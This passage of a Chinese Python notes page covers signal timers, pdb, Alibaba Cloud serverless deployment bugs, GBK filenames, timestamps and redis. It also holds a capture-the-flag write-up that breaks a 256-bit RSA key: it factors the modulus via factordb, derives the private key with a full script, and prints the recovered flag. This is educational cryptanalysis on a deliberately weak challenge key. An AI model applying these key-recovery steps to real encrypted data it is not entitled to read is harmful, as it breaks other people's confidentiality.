    <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
        <span class="c1"># 你的定时器代码写在这里 Your function here</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Count! {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">COUNT</span><span class="p">))</span>
        <span class="n">COUNT</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">INTERVAL</span><span class="p">))</span> <span class="c1">#再设置一个clock就能循环往复咯</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">INTERVAL</span><span class="p">))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">23333</span><span class="p">)</span>
</pre></div>


<hr />
<h2 id="pdb">使用pdb进行调试<a class="headerlink" href="#pdb" title="Permanent link">&para;</a></h2>
<p>在需要调试的文件头部加入</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">pdb</span>
</pre></div>


<p>需要停下来的地方加入</p>
<div class="codehilite"><pre><span></span>pdb.set_trace()
</pre></div>


<p>Tutorial: <a href="https://github.com/spiside/pdb-tutorial">https://github.com/spiside/pdb-tutorial</a></p>
<hr />
<h2 id="pythonserverlessfunction-as-service">使用Python开发Serverless(Function as Service)后端服务<a class="headerlink" href="#pythonserverlessfunction-as-service" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/zjuchenyuan/zju-jwb-to-icalendar">项目地址 &amp; 部署过程</a></p>
<p>如果您只是需要部署一个Example，↑↑↑(顺手求个Star)；如果您对这个代码是如何写出来的和踩坑过程感兴趣，继续看吧：</p>
<h3 id="_8">踩过的坑与解决过程(论阿里云是怎么把人气死的)<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<h4 id="1api">1.API网关与函数计算的对接<a class="headerlink" href="#1api" title="Permanent link">&para;</a></h4>
<p>按照<a href="https://help.aliyun.com/document_detail/54788.html">教程</a>，当时不够耐心，拿着hello world的程序（不要信教程中的2.1部分的截图）就在使用API网关，结果总是返回503</p>
<p>耐心下来看文档把程序改为后面的撞墙式程序就好了，人家其实说了函数计算应该返回的数据结构，不按照这个结构来就会503：</p>
<div class="codehilite"><pre><span></span>{
    &quot;isBase64Encoded&quot;: True或者False,
    &quot;statusCode&quot;: 200, #可以为302来实现跳转
    &quot;headers&quot;: {...} #返回的response headers，但其中的Content-Type没有作用
    &quot;body&quot;: &quot;...&quot; #返回的网页正文内容
}
</pre></div>


<h4 id="2api">2.修改API网关参数定义后要再次发布<a class="headerlink" href="#2api" title="Permanent link">&para;</a></h4>
<p>无论有没有改Mock设置，只要改动了设置都需要重新发布，发布线上版本即可</p>
<h4 id="3windowsfclifcliexe">3.不能使用Windows版本的fcli工具(fcli.exe)<a class="headerlink" href="#3windowsfclifcliexe" title="Permanent link">&para;</a></h4>
<p>人家已经发布了新版本的fcli解决了此问题</p>
<p>这个bug简直了，整个流程如下：</p>
<p>按照文档说明一路部署上传都没有问题，调用函数的时候却说<code>Unable to import module 'index'</code></p>
<p>然后我就在Linux服务器上<code>docker pull python:2.7</code>然后<code>docker run -it --rm -v /root/ical:/code</code> python:2.7 /bin/bash<code>，进入bash后</code>cd /code; python<code>，进入python后</code>import index`</p>
<p>啊哈，发现是<code>ImportError: No module named 'bs4'</code>，自己的锅，用<code>pip install bs4 -t .</code>一个个解决依赖包后，在docker容器中总算是能够跑起来了，且能正常返回了</p>
<p>然后用<code>fcli.exe shell</code>的<code>mkf</code>再上传一次，调用函数还是老样子<code>Unable to import module 'index'</code>，令人很抓狂。。。</p>
<p>突然想到不能被import应该是全局的import失败了，多次折腾后，把<code>from grabber import grabber</code>移动到index函数中，总算得到了明确的报错：还是<code>ImportError: No module named 'bs4'</code>；哈？这是什么鬼，明明我都把bs4文件夹放到代码目录下了，为啥还是报错？</p>
<p>既然他说import失败，会不会是Python搜索包的PATH的问题，于是Google到了把当前文件所在的目录加入搜索的方法：</p>
<div class="codehilite"><pre><span></span>sys.path.append(os.path.dirname(os.path.abspath(__file__)))
</pre></div>


<p>Orz, 还是没有用。。。</p>
<p>想到既然部署后代码文件夹<code>/code</code>没有我需要的依赖包，那<code>/code</code>文件夹里面到底有啥呢？果断fuck一下，在index函数开头写上:</p>
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;fuck&quot;</span><span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&quot;/code&quot;</span><span class="p">))}</span>
    <span class="kn">import</span> <span class="nn">bs4</span> <span class="c1">#会出错的import</span>
    <span class="o">...</span><span class="c1">#正常代码</span>
</pre></div>


<p>总算调用成功了，然后一看输出结果，woc! (内心中骂了多次mdzz阿里云</p>
<p>给张截图：</p>
<p><img alt="" src="../assets/img/fuckaliyun.jpg" /></p>
<p>os.listdir应该返回的是当前这个文件夹下含有的文件名称和文件夹名称，而现在我们看到的是含有<code>\\</code>很像路径名的东西，说明这个fcli.exe把windows的<code>\\</code>路径名当成了文件名的一部分，部署后在/code文件夹下也就对应创建了名称为<code>bs4\\__init__.py</code>这样的文件(根本没有bs4子文件夹)，Python当然会找不到bs4这个包啊！摔！</p>
<p>改用人家fcli的Linux 64bit版本，问题解决。。。</p>
<p>总结一下，万万想不到Windows版本的工具(针对0.5版本)会把路径分隔符<code>\\</code>当成文件名一部分来看待，真是大开眼界</p>
<hr />
<h2 id="linuxgbk">修复Linux下gbk编码的文件名<a class="headerlink" href="#linuxgbk" title="Permanent link">&para;</a></h2>
<p>代码见<a href="../code/fixgbknames.py">code/fixgbknames.py</a></p>
<p>在特殊情况下，Linux中可能会有gbk编码的文件名，这种文件用<code>ls</code>查看都是乱码，难以操作</p>
<p>如何修复这些<code>错误</code>的文件名呢？用到<code>python3</code>提供的os.walk(b&rdquo;.&rdquo;)就能得到bytes类型的文件名，然后<code>os.system</code>调用bytes类型的<code>mv</code>命令行就好啦~</p>
<hr />
<h2 id="crack-rsa">Crack RSA!<a class="headerlink" href="#crack-rsa" title="Permanent link">&para;</a></h2>
<h3 id="_9">题目信息<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>题目来源：<a href="https://docs.google.com/forms/d/e/1FAIpQLSfOI5AgEvlqa6-nRLAZI8Dvs6_XmZDHSog2pKteS5rvp3AU0Q/viewform">清华蓝莲花战队纳新表（需自备梯子）</a></p>
<p>密码学 (Cryptography)</p>
<p>RSA算法的原理以及破解，请下载<a href="https://d.py3.io/rsa.zip">这个文件</a>，解密其中的flag.enc文件。</p>
<h3 id="rsa">RSA是啥<a class="headerlink" href="#rsa" title="Permanent link">&para;</a></h3>
<p>略&hellip;(连这个都不知道还不去google，你适不适合CTF心里一点B数都没有吗)</p>
<p>符号约定： n一个大数， p和q是它的质因子，d私钥，m信息明文，c信息密文</p>
<h3 id="_10">破解的数学原理<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>参考：https://stackoverflow.com/questions/4078902/cracking-short-rsa-keys</p>
<p>Google搜索关键词 crack rsa key</p>
<p>给定公钥n和e，假定我们成功分解n = p * q，那么求出d</p>
<div class="codehilite"><pre><span></span>d = e^-1 mod phi(n)
  = e^-1 mod (p-1)*(q-1)
</pre></div>


<p>现在我们有了私钥d，可以对密文c解密得到明文m：</p>
<div class="codehilite"><pre><span></span>m = c^d (mod n)
</pre></div>


<h3 id="_11">实现它<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<h4 id="ne">题目给的公钥是啥格式，怎么读取出N和e?<a class="headerlink" href="#ne" title="Permanent link">&para;</a></h4>
<p>题目给的公钥是这样的：</p>
<div class="codehilite"><pre><span></span>-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb
e+fuqvuwBPUfAgMBAAE=
-----END PUBLIC KEY-----
</pre></div>


<p>看起来很短，估计是可以分解的比较小的N</p>
<p>google搜索关键词：openssl get n from public key</p>
<p>参考：https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</p>
<p>人家给出了这样的做法：(环境Linux，已经安装openssl)</p>
<div class="codehilite"><pre><span></span># 丢弃头尾的---行，提取公钥内容并合并一行（这是base64编码的字符串）
PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`
# 编码格式是asn1，查看这种编码的格式
echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i
</pre></div>


<p>将输出：</p>
<div class="codehilite"><pre><span></span>    0:d=0  hl=2 l=  60 cons: SEQUENCE
    2:d=1  hl=2 l=  13 cons:  SEQUENCE
    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption
   15:d=2  hl=2 l=   0 prim:   NULL
   17:d=1  hl=2 l=  43 prim:  BIT STRING
</pre></div>


<p>最后一行BIT STRING就是数据所在的位置，偏移为17</p>
<p>提取出来：</p>
<div class="codehilite"><pre><span></span>echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17
</pre></div>


<p>得到：</p>
<div class="codehilite"><pre><span></span>    0:d=0  hl=2 l=  40 cons: SEQUENCE
    2:d=1  hl=2 l=  33 prim:  INTEGER           :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F
   37:d=1  hl=2 l=   3 prim:  INTEGER           :010001
</pre></div>


<p>嗯~这样就看到十六进制的n和e啦，转为十进制的话python里面直接输入:</p>
<div class="codehilite"><pre><span></span>n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F
print(n) 
</pre></div>


<p>上述python执行后将输出</p>
<p>90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
<p>同理我们得知e=65537，一般RSA加密都会把公钥的e选为65537</p>
<h4 id="n-pq">怎么分解n 得到p和q？<a class="headerlink" href="#n-pq" title="Permanent link">&para;</a></h4>
<p>你可以自己写代码，然而我懒，直接查数据库：</p>
<p>打开factordb.com这个神奇的网站，输入n的值就能查到分解结果啦：</p>
<p>http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
<p>分解结果：</p>
<div class="codehilite"><pre><span></span>9049988742...31&lt;77&gt; = 283194537446483890135816972554288437117&lt;39&gt; · 319567913424286672035093410391626922443&lt;39&gt;
</pre></div>


<p>好了，我们就知道 p q了，具体哪个是p哪个是q并不重要</p>
<p>p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443</p>
<h4 id="d">怎么计算私钥d<a class="headerlink" href="#d" title="Permanent link">&para;</a></h4>
<p>根据RSA原理， d = e^-1 mod (p-1)*(q-1)， 现在我们有了p和q，mod后面的(p-1)*(q-1)自然是可以求出来的</p>
<p>但e^-1是个啥玩意？倒数？ 倒数还能求模？</p>
<p>emmm 其实是求逆元啦 然而不会写代码怎么办，当时是继续google啊</p>
<p>google关键词： python calculate inverse mod</p>
<p>参考：https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</p>
<p>得到代码：</p>
<div class="codehilite"><pre><span></span>def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception(&#39;modular inverse does not exist&#39;)
    else:
        return x % m
</pre></div>


<p>看不懂这代码在干啥？我也看不懂，但没关系，直接用就行 这么多人点赞肯定是对的</p>
<p>那现在就着手把这代码搬运到我们的py中咯：</p>
<div class="codehilite"><pre><span></span>N = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F
e = 0x10001

p = 283194537446483890135816972554288437117
q = 319567913424286672035093410391626922443

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception(&#39;modular inverse does not exist&#39;)
    else:
        return x % m

d = modinv(e, (p-1)*(q-1))
print(d)
</pre></div>


<p>上述python将输出34458919248694250828820386546500026880096887166581679876896066449320377773297， 真是一个好大的d啊。。。</p>
<h4 id="flagencint">怎么把flag.enc当成一个int读入？<a class="headerlink" href="#flagencint" title="Permanent link">&para;</a></h4>
<p>试图用记事本打开flag.enc，乱码了；那用二进制形式打开flag.inc文件看看：
<img alt="" src="https://d.py3.io/img/15365186860.png" /></p>
<p>emmm一共32字节长的密文，直接读文件将得到bytes strig，怎么把它转为一个很大的整数呢？</p>
<p>google关键词： python byte string to int</p>
<p>参考：https://stackoverflow.com/questions/444591/convert-a-string-of-bytes-into-an-int-python</p>
<p>人家给出了python3.2以后可以用int.from_bytes的方式，继续写我们的py咯：</p>
<div class="codehilite"><pre><span></span>encrypteddata = open(&#39;flag.enc&#39;,&#39;rb&#39;).read()
c = int.from_bytes(encrypteddata, &#39;big&#39;)
print(c)
</pre></div>


<p>这里的&rsquo;big&rsquo;表示大端存放的方式，就是最重要的那一位是靠左边的</p>
<p>插一句：通过询问其他大佬，我也折腾出了一种naive的方法——使用binascii模块先转为hex编码，然后hex按16字节转int:</p>
<div class="codehilite"><pre><span></span><span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</pre></div>


<h4 id="_12">计算明文<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
<p>公式（密码学肯定要考的，所以再记一次咯）</p>
<div class="codehilite"><pre><span></span>m = c^d (mod n)
</pre></div>


<p>问题来了，d是个那么大的数，如果直接写一个：</p>
<div class="codehilite"><pre><span></span># 在python里**表示乘方
m = (c**d)%n
</pre></div>


<p>果然运行这个py就卡死了，实际上并没有必要算出精确的c**d，我们需要调用快速的mod乘方的方法</p>
<p>google关键词： python mod pow</p>
<p>参考：https://stackoverflow.com/questions/32738637/calculate-mod-using-pow-function-python</p>
<p>人家说pow函数就可以提供第3个参数，例如pow(6, 8, 5)就是 6^8 mod 5</p>
<p>那就写代码咯(瞎写，C语言的pow需要#include <math.h> 那我就也从math导入吧)：</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">math</span> <span class="kn">import</span> <span class="nb">pow</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
</pre></div>


<p>然而命途多舛，果然报错：</p>
<div class="codehilite"><pre><span></span>Traceback (most recent call last):
  File &quot;run.py&quot;, line 35, in &lt;module&gt;
    m = pow(c,d,n)
TypeError: pow expected 2 arguments, got 3
</pre></div>


<p>emmm&hellip; 奇了怪了，这是什么鬼嘛，说好的支持第三个参数呢，翻回去仔细看人家给的<a href="https://docs.python.org/3/library/functions.html#pow">文档链接</a></p>
<p>嗯？这文档的标题就是Built-in Functions，我懂了！ 支持第三个参数的pow函数是内置的那个，而不是math库提供的，删掉<code>from math import pow</code>这一句就好了</p>
<p>我们的py又加上了两行：</p>
<div class="codehilite"><pre><span></span>m = pow(c,d,n)
print(m)
</pre></div>


<p>得到输出 4114174865819530012247735243997890458185276719507135882385278623252053258</p>
<h3 id="flag">明文这么一个大数 我要的flag呢？<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h3>
<p>cy打开了他的笔记本 <a href="https://py3.io/Python.html#bytes">https://py3.io/Python.html#bytes</a></p>
<p>查到了 十六进制字符串转bytes字符串 和 拿到一个int转字符串 的方法：</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="p">)</span> <span class="p">)</span>
</pre></div>


<p>果然 又tm出错了：</p>
<div class="codehilite"><pre><span></span>Traceback (most recent call last):
  File &quot;run.py&quot;, line 37, in &lt;module&gt;
    print( b16decode( hex(m)[2:].upper() ) )
  File &quot;/usr/lib/python3.5/base64.py&quot;, line 276, in b16decode
    return binascii.unhexlify(s)
binascii.Error: Odd-length string
</pre></div>


<p>odd-length啥意思？奇数长度？对噢 十六进制字符串肯定要偶数长度才行（两个一组表示一个字节嘛） 那么就前面补个0咯</p>
<p>py代码如下：（其实你也可以试试int.to_bytes方法）</p>
<div class="codehilite"><pre><span></span>plaindata = hex(m)[2:].upper()
if len(plaindata)%2 :
    plaindata = &quot;0&quot;+plaindata
print(b16decode(plaindata))
</pre></div>


<p>输出：</p>
<div class="codehilite"><pre><span></span>b&#39;\x02T\x1b:(\x02\xb9\x8c8\xbb\x00CTF{256i3_n0t_SAfe}\n&#39;
</pre></div>


<p>啊哈！ 总算能搞定啦，flag到手！</p>
<h3 id="_13">完整的代码<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="c1"># parse public key: https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</span>
<span class="c1"># PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`</span>
<span class="c1"># echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i</span>
<span class="c1"># echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17</span>


<span class="n">n</span> <span class="o">=</span> <span class="mh">0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
<span class="n">e</span> <span class="o">=</span> <span class="mh">0x10001</span>
<span class="k">print</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<span class="c1"># visit http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
<span class="n">d</span> <span class="o">=</span> <span class="n">modinv</span><span class="p">(</span><span class="n">e</span><span class="p">,</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
<span class="k">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="n">encrypteddata</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.enc&#39;</span><span class="p">,</span><span class="s1">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">binascii</span><span class="o">.</span><span class="n">b2a_hex</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">c</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">encrypteddata</span><span class="p">,</span> <span class="s1">&#39;big&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
<span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16decode</span>
<span class="n">plaindata</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">m</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaindata</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span> <span class="p">:</span>
    <span class="n">plaindata</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">+</span><span class="n">plaindata</span>

<span class="k">print</span><span class="p">(</span><span class="n">b16decode</span><span class="p">(</span><span class="n">plaindata</span><span class="p">))</span>
</pre></div>


<hr />
<h2 id="_14">时间戳与字符串相互转换<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h2>
<p>import time</p>
<p>得到当前时间戳： int(time.time())</p>
<p>得到当前时间字符串：time.strftime(&ldquo;%Y-%m-%d %H:%M:%S&rdquo;)</p>
<p>时间戳1381419600转字符串：time.strftime(&ldquo;%Y-%m-%d %H:%M:%S&rdquo;, time.localtime(1381419600))</p>
<p>字符串&rdquo;2013-10-10 23:40:00&rdquo;转时间戳：int(time.mktime(time.strptime(&ldquo;2013-10-10 23:40:00&rdquo;,&rdquo;%Y-%m-%d %H:%M:%S&rdquo;)))</p>
<hr />
<h2 id="redis">用redis存储字典<a class="headerlink" href="#redis" title="Permanent link">&para;</a></h2>
<p>假设存储一个用户名对应用户ID的字典，名称为USERS，例如{&ldquo;zhangsan&rdquo;:1, &ldquo;lisi&rdquo;:2}</p>
<div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">redis</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="o">.</span><span class="n">StrictRedis</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">6379</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="c1">#db参数可以理解为命名空间</span>
<span class="k">assert</span> <span class="n">r</span><span class="o">.</span><span class="n">ping</span><span class="p">()</span> <span class="c1"># 是否成功连上</span>

<span class="n">USERS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;zhangsan&quot;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;lisi&quot;</span><span class="p">:</span><span class="mi">2</span><span class="p">}</span>

<span class="c1"># 存储字典</span>
<span class="n">r</span><span class="o">.</span><span class="n">hmset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">USERS</span><span class="p">)</span>

<span class="c1"># 获得已经存储的字典里面有哪些键，返回bytes的list</span>
<span class="n">KEYS</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hkeys</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span> 

<span class="c1"># 获得整个字典并转换回原来的类型</span>
<span class="n">USERS1</span> <span class="o">=</span> <span class="p">{</span><span class="n">i</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">hgetall</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">items</span><span class="p">()}</span>

<span class="c1"># 修改字典中一个key的value</span>
<span class="n">r</span><span class="o">.</span><span class="n">hset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span><span class="s2">&quot;zhangsan&quot;</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span>

<span class="c1"># 删除存储的字典，只能一个个删，先要hkeys获取有哪些键</span>
<span class="n">_</span><span class="o">=</span><span class="p">[</span><span class="n">r</span><span class="o">.</span><span class="n">hdel</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span> <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">hkeys</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span> <span class="p">]</span>

<span class="c1"># 扫描式获得已经存储的字典里面有哪些键</span>
<span class="c1">## 如果字典里面存储了太多东西，执行KEYS会卡住整个redis，用hscan是更好的选择</span>
<span class="c1">## 这里先生成一个比较大的字典存进去</span>
<span class="kn">import</span> <span class="nn">random</span><span class="o">,</span> <span class="nn">string</span>
<span class="n">randomstr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">n</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span>
<span class="n">USERS</span> <span class="o">=</span> <span class="p">{</span><span class="n">randomstr</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">)}</span> <span class="c1"># 生成一个1w条记录的字典</span>
<span class="n">r</span><span class="o">.</span><span class="n">hmset</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">USERS</span><span class="p">)</span> <span class="c1"># 存进去</span>

<span class="c1">## 循环hscan</span>
<span class="n">cursor</span><span class="p">,</span> <span class="n">result</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hscan</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">)</span>
<span class="k">while</span> <span class="n">cursor</span><span class="p">:</span>
    <span class="n">cursor</span><span class="p">,</span> <span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">hscan</span><span class="p">(</span><span class="s2">&quot;USERS&quot;</span><span class="p">,</span> <span class="n">cursor</span><span class="p">)</span>
    <span class="n">result</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>

<span class="n">USERS2</span> <span class="o">=</span> <span class="p">{</span><span class="n">i</span><span class="o">.</span><span class="n">decode</span><span class="p">():</span><span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span> <span class="ow">in</span> <span class="n">result</span><span class="o">.</span><span class="n">items</span><span class="p">()}</span> <span class="c1">#从bytes转为原来的格式</span>
<span class="k">assert</span> <span class="n">USERS</span><span class="o">==</span><span class="n">USERS2</span> <span class="c1">#存进去的与取出来的应该相同</span>
</pre></div>
                
                  
                
